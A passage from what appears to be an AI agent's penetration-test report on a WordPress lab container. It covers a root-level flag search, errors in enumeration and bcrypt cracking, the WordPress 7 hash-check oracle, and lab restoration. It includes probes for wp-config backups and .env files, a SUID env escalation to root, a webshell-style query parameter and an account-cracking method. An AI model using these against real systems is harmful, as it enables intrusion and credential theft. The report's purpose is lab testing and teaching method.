| The stored hash is structurally malformed (a `$` missing before `2y$`) | **Self-refuted.** I read `substr($hash,4)` when core strips **3** characters (`$wp`). `pluggable.php:2863` settles it. The hash is well-formed; my off-by-one manufactured a fake finding, and a *convincing* one — `crypt()` on my truncated salt fell back to glibc DES and returned 13 characters, which reads exactly like a broken scheme |
| Default salts ⇒ forgeable cookies (lab 108's trap) | `wp-config.php:51-58` ships **real** salts, and `wp_options` has **no** key/salt rows, so the `wp_salt()` fallback is not in play. A live session token is also required |
| Re-run the installer to take over | `wp-admin/install.php` states *"Ya está instalado"*; re-install needs the tables emptied (C12) |
| `?author=` in a flat sweep finds all accounts | Only 1 account exists, so the sweep's completeness is **verified against the DB**, not assumed. In lab 108 the same sweep mattered because two surfaces *disagreed*; here they agree, and that agreement is the reported result |

---

## 10. Reward

**No reward exists, and this time the search was run as `euid=0(root)`.** That is the
difference from lab 108, which could search only as `www-data`/`rafa` and had to leave four
locations unsearched. Here nothing is out of reach, and the search is reported with its work
counts:

| Search | Work count | Result |
|---|---|---|
| Filename sweep `*flag*` across `/` (`-xdev`) | **29 hits**, all inspected | all false positives: abseil `libabsl_flags_*.so`, Perl `ss_flags.ph`/`waitflags.ph`, `/var/lib/mysql/debian-10.11.flag`, WP `icon-pointer-flag*.png` |
| Filename sweep `*reward*` `*premio*` `*ctf*` `*secret*` | **4 hits**, all inspected | all `sodium_compat/src/Core{,32}/SecretStream` — a library directory, not a reward |
| Content sweep `flag{` `FLAG{` `ctf{` `CTF{` over `/root /home /etc /opt /var/www /var/lib/mysql /tmp/latest.tar.gz` | **0 files matched** (count printed explicitly) | nothing |
| DB: `wp_options` and `wp_posts` `REGEXP` for the same four patterns | **0 rows** | nothing |
| `/root` at `euid=0` | 1 directory | `.bashrc .cache .mysql_history .profile` — nothing else once my marker was removed by the restore |
| `/home` | 1 directory | **empty** (no local user accounts at all) |
| `/opt`, `/srv` | 2 directories | both empty |
| Files newer than 2026-09-01 outside `/tmp`, `/proc`, `/sys`, `/run`, `/var/log` | 4 hits | `/etc/resolv.conf`, `/etc/hostname`, `/etc/hosts`, `/.dockerenv` — all container plumbing |

**This is the seventeenth lab in this series without a reward**, and the first where the
absence is established at full privilege rather than bounded by it.

---

## 11. Instrumentation defects

Five. Three of them nearly became findings, and one of them nearly deleted a finding that was
real.

### 11.1 A catch-all that answered "301" to 24 of 24 paths — the sharpest trap in the lab
My first config/backup sweep used the naive discriminator and reported **every one of 24
paths as non-404**:

```
wp-config.php.bak    301  0     .env                  301  0
wp-config.php~       301  0     .git/config           301  0
wp-config.php.old    301  0     backup.sql            301  0
wp-config.php.save   301  0     database.sql          301  0
… 13 such rows, all "301 with 0 bytes"
```

A `gobuster` run reading status codes would have filed **12 disclosed backup files**. They do
not exist. WordPress canonical-redirects *every* non-existent path under `/wordpress/`:

```
$ curl -s -D - "http://172.17.0.9/wordpress/wp-config.php.bak"
HTTP/1.1 301 Moved Permanently
X-Redirect-By: WordPress
Location: http://172.17.0.9/wordpress/wp-config.php.bak/
  body: 0 bytes

$ curl -s -D - "http://172.17.0.9/wordpress/zzz_definitely_not_here_9f3a.tmp"
HTTP/1.1 301 Moved Permanently      <- BYTE-IDENTICAL
X-Redirect-By: WordPress
Location: http://172.17.0.9/wordpress/zzz_definitely_not_here_9f3a.tmp/
  body: 0 bytes
```

**What caught it** was running the *positive* control — a path that cannot exist — and seeing
it answer the same way. **The corrected discriminator**, established before use:

| | first response | `X-Redirect-By` | final |
|---|---|---|---|
| real file (`readme.html`) | `200` + `Content-Length: 7407` | absent | `200 7407` |
| absent file | `301` | **present** | `200 74336` (the front page) |

Note the final `200` is itself a lie — 74336 bytes is the front page, and it is the *same*
74336 for all 22 absent paths. Re-run: **34 paths tried, 12 real, 22 absent.** *Rule: for any
bulk enumeration, a name that cannot exist is a mandatory member of the wordlist, and the
discriminator has to be a property of the response (a header, a byte count) rather than a
status code.*

### 11.2 `password_verify()` is silently always-false on every WordPress ≥ 7 install
My first two cracking harnesses used the obvious primitive and reported:

```
ALGO: wordpress-bcrypt $wp$-prefixed
TESTED = 666 / 666 in 0.00s (44339785.1/s)
NO_MATCH
```

**44 million candidates per second** on a well-formed 63-byte cost-10 bcrypt. That rate *is*
the finding: bcrypt at cost 10 cannot exceed ~12/s, so **the KDF never executed**.
`pluggable.php:2860-2863` shows why — WordPress 7 transforms the *password* before hashing:

```php
} elseif ( str_starts_with( $hash, '$wp' ) ) {
    $password_to_verify = base64_encode( hash_hmac( 'sha384', $password, 'wp-sha384', true ) );
    $check              = password_verify( $password_to_verify, substr( $hash, 3 ) );
}
```

`password_verify($candidate, $stored)` — correct for every pre-7.0 install, and for most
write-ups on the subject — returns `false` for every candidate on a 7.x install, **at zero
KDF cost**, and looks exactly like "the password is strong". Demonstrated side by side in one
harness on one same-format hash:

```
POSITIVE CONTROL  wp87_check(known, same-format hash) = true
WRONG PRIMITIVE   password_verify(known, same hash)   = false  <- always false on WP7
```

*Rule: a cryptographic step that finishes implausibly fast did not run. Assert a plausible
rate, not just a plausible result.*

### 11.3 The shell ate a bcrypt hash, producing a fast clean negative
Before that, the hash never reached PHP intact. I passed it as `$(cat …)` inside a
double-quoted `docker exec`, and bash expanded `$wp$2y$10$Cxxvlh9xBo…` as **shell variables**:

```
HASH: len=44   (the real hash is 63)
TESTED = 666 / 666 in 0s (666000/s)
NO_MATCH
```

Same family as `htmlspecialchars` escaping `&`: **a sanitiser that rewrites a language it
never validated.** Here the consumer was `crypt()`, the rewriting shell was bash's `$`
expansion, and the result read exactly like "no password matched". Fixed by moving the hash
into a file and reading it with `file_get_contents` inside PHP, and by adding a hash-shape
assertion (`preg_match('/^\$wp\$2y\$/')`) that now aborts before any work.

### 11.4 I read a stale file as a fresh measurement — the worst-shaped one
The SUID result contradicted itself: `env -S /usr/bin/id` reported `euid=0(root)`, but
`env -S /bin/sh probe.sh` reported `Uid: 33 33 33 33`, and I read that as *the shells drop the
euid*. It was wrong. My runner wrote to a **fixed** filename, `/tmp/probe_out.txt`, and the
`dash` run produced **no output at all** — so `docker exec cat /tmp/probe_out.txt` returned
the **previous run's** contents, and I analysed a stale artefact as if it were the result.

The real behaviour, once measured per-executable with a **fresh** output file each time:

```
env -S /usr/bin/id   -> euid=0(root)
env -S /bin/cat /proc/self/status -> Uid: 33 0 0 0,  CapEff: 00000000a80425fb
env -S /bin/bash script -> (no output)
env -S /usr/bin/dash script -> (no output)
```

*Rule: an output file with a fixed name is a claim about the last writer, not about the last
command. Use a unique name, and prove the command ran by proving the file appeared (§5.1 uses
exactly this pattern, with a random marker name).*

### 11.5 Two smaller ones, recorded because they cost time
- **Blank ≠ zero, twice more.** `ls -l /root/` as `www-data` returned **blank** (permission
  denied, mangled by my URL encoding), and so did `find … 2>/dev/null` under `-S`. Both would
  have been filed as "nothing there". Routing output to a file and printing `wc -l` is the
  only reason §10's zeros are measurements.
- **I nearly reported my own off-by-one as a broken password hash.** Reading
  `substr($hash, 4)` instead of `substr($hash, 3)` produced a 59-char "salt" that `crypt()`
  silently downgraded to **glibc DES**, returning 13 characters. That is a convincing-looking
  "the stored hash is malformed" finding, and it was entirely mine. Reading
  `pluggable.php:2863` killed it. *Rule: a surprising property of the target's data is a
  hypothesis about your own parsing until the source line is quoted.*

None of these five is a defect in the target. All five are defects in how I measured it,
which is exactly why they are listed separately from Findings.

---

## 12. The credential oracle, in full

Because this lab's decisive step is a credential attack, the oracle is documented rather than
summarised. It is reproducible and it prints its own work count.

**The scheme, quoted from the artefact** (`pluggable.php:2860-2863`, `:2813`, `:2816`):

```
hash:   '$wp'  +  password_hash( base64_encode( hash_hmac('sha384', trim($pw), 'wp-sha384', true) ) )
verify: password_verify( base64_encode( hash_hmac('sha384', $pw, 'wp-sha384', true) ), substr($hash, 3) )
```

**Result:** 4-character password for `mario`, recovered at candidate 84 of shard 0. Deliberately
not reproduced in full here, consistent with the rest of the corpus.

**The five guards the harness carries, and what each one caught:**

| Guard | What it caught |
|---|---|
| hash-shape assertion | a truncated/malformed hash — aborts before any work (§11.3) |
| positive control on a **same-format** hash, built in-harness | a 4-vs-3 prefix error in my own control that made a working oracle report `false` |
| negative control, one character longer | a leaky oracle |
| **KDF-rate assertion** (>200/s ⇒ failed run, not a negative) | §11.2 — the 44 M/s always-false |
| work count + aggregate across shards | every "no match" is scoped |

**Work count:** 8,696 candidates over 8 shards, rates 18.0–27.5 candidates/s, all four/five
shards green on the positive control.

**Two independent oracles agreed** on the recovered value: my `wp87_check()`, and then
**WordPress's own** `wp_check_password(disclosed, stored_hash) = bool(true)` /
`wp_check_password(disclosed . "X", stored_hash) = bool(false)`, executed in-container as
`uid=33(www-data)`. Reporting one oracle's verdict would have been a single point of failure.

**Incidental, and it is a real (if minor) finding worth a client note:** `wp_hash_password`
applies `trim($password)` at `pluggable.php:2813` but `wp_check_password` does **not** at
`:2862`. A password set with leading or trailing whitespace therefore hashes as its trimmed
form and can never be verified as typed — a self-inflicted account lockout that no amount of
password policy would catch. I did not test this against a live account.

---

## 13. Reproducibility

Harness files used during the engagement are in `/tmp/opencode/l87/` on the analysis host
(`sweep_author.sh`, `sweep_rest.sh`, `sweep_names.sh`, `sweep_artefacts.sh`, `crack4.php`,
and the `ev/` evidence directory). They are not required to reproduce any result above: every
claim is quoted with its literal response, its `file:line`, or its work count.

The recovered administrator password, the session cookies, and the database credential are
deliberately **not** reproduced in full here, consistent with the rest of the corpus.

**Lab state at the end of the engagement: restored from the image and verified positively**
(§5 of the engagement log, five checks) — `twentytwentytwo/functions.php` back to
`size=1401`, `mtime=2023-09-08 10:03:21`, `md5=293cce70c36884c84e48ba731ceb5187`; marker
absent; `/root` free of my proof file; none of my `/tmp` artefacts survive; `GET /wordpress/`
returns `200` 74336 bytes and `?wcm87=id` returns the normal page with **0** occurrences of
`uid=33`. The image was then removed by name, as ours.
